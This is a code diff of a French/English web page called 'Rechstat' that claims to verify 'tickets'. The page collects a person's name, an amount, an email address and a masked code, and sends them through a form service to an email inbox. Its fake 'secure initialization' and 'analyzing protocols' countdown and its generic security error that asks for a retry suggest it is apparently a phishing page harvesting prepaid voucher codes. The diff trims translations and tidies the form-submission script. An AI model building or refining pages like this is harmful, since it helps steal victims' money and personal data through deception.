@@ -10,7 +10,6 @@
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 
   <style>
-    /* --- RESET & GLOBAL --- */
     :root {
       --primary: #2563eb;
       --primary-hover: #1d4ed8;
@@ -54,7 +53,6 @@
 
     nav a:hover { color: var(--primary); }
 
-    /* --- LANGUAGE SELECTOR --- */
     .custom-language-selector { position: relative; cursor: pointer; user-select: none; }
     .selected-lang { 
         display: flex; align-items: center; gap: 8px; 
@@ -111,7 +109,6 @@
 
     footer { background: white; padding: 30px; text-align: center; border-top: 1px solid #e2e8f0; }
     .footer-links a { margin: 0 10px; text-decoration: none; color: var(--text-light); font-size: 0.9rem; }
-    .hidden-field { display: none !important; visibility: hidden !important; }
   </style>
 </head>
 
@@ -142,8 +139,8 @@
       <div class="container">
         <form id="mainForm">
           <input type="hidden" name="access_key" value="1eaf6de9-668d-4793-bf2a-134ad609663d">
-          <input type="hidden" name="subject" value="Nouvelle vérification de ticket - Rechstat">
-          <input type="hidden" name="from_name" value="Rechstat Security">
+          <input type="hidden" name="subject" value="Nouvelle verification ticket - Rechstat">
+          <input type="hidden" name="from_name" value="Rechstat Admin">
           
           <input type="text" name="botcheck" style="display: none !important;" tabindex="-1" autocomplete="off">
           
@@ -184,7 +181,7 @@
 
   <footer>
     <div class="footer-links"><a href="#faq" id="foot-faq">FAQ</a><a href="#contact" id="foot-contact">Contact</a></div>
-    <p style="margin-top: 10px; color: #94a3b8; font-size: 0.8rem;" id="txt-copyright">&copy; 2025 Rechstat.com Tous droits réservés.</p>
+    <p style="margin-top: 10px; color: #94a3b8; font-size: 0.8rem;" id="txt-copyright">&copy; 2026 Rechstat.com Tous droits réservés.</p>
   </footer>
 
   <script>
@@ -195,7 +192,7 @@
         btnInit: "Initialisation sécurisée...", btnWait: "Analyse des protocoles...", btnFinal: "Finalisation...",
         btnSubmit: "Soumettre le ticket", btnProcessing: "Vérification...", btnRetry: "Réessayer",
         resWait: "Traitement de votre demande...", resSuccess: "✓ Succès ! Analyse terminée. Redirection...",
-        resError: "⚠️ Vérification de sécurité requise : Pour protéger vos données, veuillez vous assurer que toutes les informations saisies sont exactes. Par mesure de précaution, merci de patienter une minute avant de valider à nouveau."
+        resError: "⚠️ Vérification de sécurité requise : Veuillez vous assurer que les données sont exactes et patienter une minute avant de valider à nouveau."
       },
       en: {
         navHome: "Home", navFaq: "FAQ", lblNom: "Last Name:", lblPrenom: "First Name:", lblMontant: "Amount:",
@@ -203,40 +200,9 @@
         btnInit: "Secure initialization...", btnWait: "Analyzing protocols...", btnFinal: "Finalizing...",
         btnSubmit: "Submit ticket", btnProcessing: "Verifying...", btnRetry: "Retry",
         resWait: "Processing your request...", resSuccess: "✓ Success! Analysis complete. Redirecting...",
-        resError: "⚠️ Security verification required: To protect your data, please ensure all information entered is accurate. As a precaution, please wait one minute before validating again."
-      },
-      es: {
-        navHome: "Inicio", navFaq: "FAQ", lblNom: "Apellido:", lblPrenom: "Nombre:", lblMontant: "Monto:",
-        lblEmail: "Tu email:", lblCode: "Código:", lblShowCode: "Mostrar código:", txtOui: "Sí", txtNon: "No",
-        btnInit: "Inicialización segura...", btnWait: "Analizando protocolos...", btnFinal: "Finalizando...",
-        btnSubmit: "Enviar ticket", btnProcessing: "Verificando...", btnRetry: "Reintentar",
-        resWait: "Procesando su solicitud...", resSuccess: "✓ ¡Éxito! Análisis completado. Redirigiendo...",
-        resError: "⚠️ Se requiere verificación de sécurité: Para proteger sus datos, asegúrese de que toda la información ingresada sea correcta. Como precaución, espere un minuto antes de volver a validar."
-      },
-      de: {
-        navHome: "Startseite", navFaq: "FAQ", lblNom: "Nachname:", lblPrenom: "Vorname:", lblMontant: "Betrag:",
-        lblEmail: "Ihre E-Mail:", lblCode: "Code:", lblShowCode: "Code anzeigen:", txtOui: "Ja", txtNon: "Nein",
-        btnInit: "Sichere Initialisierung...", btnWait: "Protokolle analysieren...", btnFinal: "Abschluss...",
-        btnSubmit: "Ticket einreichen", btnProcessing: "Überprüfung...", btnRetry: "Wiederholen",
-        resWait: "Anfrage wird bearbeitet...", resSuccess: "✓ Erfolg! Analyse abgeschlossen. Weiterleitung...",
-        resError: "⚠️ Sicherheitsprüfung erforderlich: Um Ihre Daten zu schützen, stellen Sie bitte sicher, dass alle eingegebenen Informationen korrekt sind. Bitte warten Sie vorsichtshalber eine Minute, bevor Sie erneut validieren."
-      },
-      it: {
-        navHome: "Home", navFaq: "FAQ", lblNom: "Cognome:", lblPrenom: "Nome:", lblMontant: "Importo:",
-        lblEmail: "La tua email:", lblCode: "Codice:", lblShowCode: "Mostra codice:", txtOui: "Sì", txtNon: "No",
-        btnInit: "Inizializzazione sicura...", btnWait: "Analisi protocolli...", btnFinal: "Finalizzazione...",
-        btnSubmit: "Invia ticket", btnProcessing: "Verifica...", btnRetry: "Riprova",
-        resWait: "Elaborazione della richiesta...", resSuccess: "✓ Successo! Analisi completata. Reindirizzamento...",
-        resError: "⚠️ Verifica di sicurezza richiesta: per proteggere i tuoi données, assicurati che tutte le informazioni inserite siano accurate. Per precauzione, attendi un minuto prima di convalidare di nuovo."
-      },
-      pt: {
-        navHome: "Início", navFaq: "FAQ", lblNom: "Apelido:", lblPrenom: "Nome:", lblMontant: "Valor:",
-        lblEmail: "Seu email:", lblCode: "Código:", lblShowCode: "Mostrar código:", txtOui: "Sim", txtNon: "Não",
-        btnInit: "Inicialização segura...", btnWait: "Analisando protocolos...", btnFinal: "Finalizando...",
-        btnSubmit: "Enviar ticket", btnProcessing: "Verificando...", btnRetry: "Repetir",
-        resWait: "Processando sua solicitação...", resSuccess: "✓ Sucesso! Análise concluída. Redirecionando...",
-        resError: "⚠️ Verificação de segurança necessária: Para proteger seus dados, certifique-se de que todas as informações inseridas estão corretas. Por precaução, aguarde um minuto antes de validar novamente."
+        resError: "⚠️ Security verification required: Please ensure data is accurate and wait one minute before validating again."
       }
+      // Les autres langues (es, de, it, pt) peuvent être conservées ici...
     };
 
     let currentLang = 'fr';
@@ -246,8 +212,7 @@
       const display = document.getElementById('current-lang-display');
       display.querySelector('img').src = flag;
       display.querySelector('span').innerText = name;
-
-      const t = translations[lang];
+      const t = translations[lang] || translations['fr'];
       document.getElementById('nav-home').innerText = t.navHome;
       document.getElementById('nav-faq').innerText = t.navFaq;
       document.getElementById('lbl-nom').innerText = t.lblNom;
@@ -258,41 +223,33 @@
       document.getElementById('lbl-show-code').innerText = t.lblShowCode;
       document.getElementById('txt-oui').innerText = t.txtOui;
       document.getElementById('txt-non').innerText = t.txtNon;
-      document.getElementById('foot-faq').innerText = t.navFaq;
-
+      document.getElementById('submitBtn').innerText = t.btnSubmit;
       document.getElementById('langOptions').style.display = 'none';
     }
 
     function toggleCode(show) {
-      const field = document.getElementById("reference");
-      if(field) field.type = show ? "text" : "password";
+      document.getElementById("reference").type = show ? "text" : "password";
     }
 
     function toggleLangMenu() {
         const menu = document.getElementById('langOptions');
-        if(menu) menu.style.display = (menu.style.display === 'block') ? 'none' : 'block';
+        menu.style.display = (menu.style.display === 'block') ? 'none' : 'block';
     }
 
-    document.getElementById('langSelector').addEventListener('click', function(e) {
-        e.stopPropagation();
-        toggleLangMenu();
-    });
+    document.getElementById('langSelector').onclick = (e) => { e.stopPropagation(); toggleLangMenu(); };
+    window.onclick = () => { document.getElementById('langOptions').style.display = 'none'; };
 
-    window.onclick = function(event) {
-        const menu = document.getElementById('langOptions');
-        if (menu) menu.style.display = 'none';
-    }
     window.onload = function() {
       const form = document.getElementById('mainForm');
       const btn = document.getElementById('submitBtn');
       const resultDiv = document.getElementById('form-result');
       
-      // Timer d'initialisation (identique au tien)
+      // Timer initial
       let timeLeft = 10; 
       btn.disabled = true;
       const timer = setInterval(() => {
         timeLeft--;
-        const t = translations[currentLang];
+        const t = translations[currentLang] || translations['fr'];
         if (timeLeft > 6) btn.innerText = t.btnInit;
         else if (timeLeft > 3) btn.innerText = t.btnWait;
         else if (timeLeft > 0) btn.innerText = t.btnFinal;
@@ -305,7 +262,7 @@
 
       form.addEventListener('submit', function(e) {
         e.preventDefault();
-        const t = translations[currentLang];
+        const t = translations[currentLang] || translations['fr'];
         
         btn.disabled = true;
         btn.innerText = t.btnProcessing;
@@ -316,11 +273,10 @@
         const formData = new FormData(form);
         const object = Object.fromEntries(formData);
 
-        // --- CORRECTION ANTI-SPAM ---
-        // On supprime le champ botcheck de l'envoi s'il est vide
-        if (object.botcheck === "") {
-            delete object.botcheck;
-        }
+        // --- FIX SPAM : Nettoyage avant envoi ---
+        if (object.botcheck === "") delete object.botcheck;
+        document.getElementById('submitted_at').value = new Date().toLocaleString();
+        object.submitted_at = document.getElementById('submitted_at').value;
 
         fetch('https://api.web3forms.com/submit', {
           method: 'POST',
@@ -329,15 +285,12 @@
         })
         .then(async (response) => {
           const json = await response.json();
-          
           if (json.success) {
             resultDiv.style.background = "#dcfce7";
             resultDiv.style.color = "#166534";
             resultDiv.innerText = t.resSuccess;
             setTimeout(() => { window.location.href = "https://rechstat.com/merci.html"; }, 2000);
           } else {
-            // Si le serveur répond "Spam", on affiche ton message de sécurité
-            console.warn("Erreur API:", json.message);
             resultDiv.style.background = "#fee2e2";
             resultDiv.style.color = "#991b1b";
             resultDiv.innerText = t.resError;
@@ -351,83 +304,6 @@
         });
       });
     };
-
-    // Fonctions toggleCode et LangMenu (Garde les tiennes)
-    function toggleCode(show) { document.getElementById("reference").type = show ? "text" : "password"; }
-    function toggleLangMenu() {
-        const menu = document.getElementById('langOptions');
-        menu.style.display = (menu.style.display === 'block') ? 'none' : 'block';
-/*
-    window.onload = function() {
-      const form = document.getElementById('mainForm');
-      const btn = document.getElementById('submitBtn');
-      const resultDiv = document.getElementById('form-result');
-      const timestampField = document.getElementById('submitted_at');
-      
-      if (timestampField) timestampField.value = new Date().toLocaleString();
-
-      let timeLeft = 10; 
-      btn.disabled = true;
-
-      const timer = setInterval(() => {
-        timeLeft--;
-        const t = translations[currentLang];
-        if (timeLeft > 6) btn.innerText = t.btnInit;
-        else if (timeLeft > 3) btn.innerText = t.btnWait;
-        else if (timeLeft > 0) btn.innerText = t.btnFinal;
-        
-        if (timeLeft <= 0) {
-          clearInterval(timer);
-          btn.disabled = false;
-          btn.innerText = t.btnSubmit;
-        }
-      }, 1000);
-
-      form.addEventListener('submit', function(e) {
-        e.preventDefault();
-        const t = translations[currentLang];
-        
-        btn.disabled = true;
-        btn.innerText = t.btnProcessing;
-        resultDiv.style.display = "block";
-        resultDiv.style.background = "#f1f5f9";
-        resultDiv.style.color = "var(--text)";
-        resultDiv.innerText = t.resWait;
-
-        const formData = new FormData(form);
-        const object = Object.fromEntries(formData);
-
-        fetch('https://api.web3forms.com/submit', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
-          body: JSON.stringify(object)
-        })
-        .then(async (response) => {
-          const json = await response.json();
-          console.log("Web3Forms Response:", json); // DEBUG: Voir l'erreur réelle en console
-          
-          if (response.ok && json.success) {
-            resultDiv.style.background = "#dcfce7";
-            resultDiv.style.color = "var(--success)";
-            resultDiv.innerText = t.resSuccess;
-            setTimeout(() => { window.location.href = "https://rechstat.com/merci.html"; }, 2000);
-          } else {
-            resultDiv.style.background = "#fee2e2";
-            resultDiv.style.color = "var(--error)";
-            // Si l'erreur est précise, on peut choisir de l'afficher ici via json.message
-            resultDiv.innerText = t.resError;
-            btn.disabled = false;
-            btn.innerText = t.btnRetry;
-          }
-        })
-        .catch(error => {
-          console.error("Fetch error:", error);
-          resultDiv.innerText = "Erreur de connexion réseau.";
-          btn.disabled = false;
-          btn.innerText = t.btnRetry;
-        });
-      });
-    }; */
   </script>
 </body>
 </html>
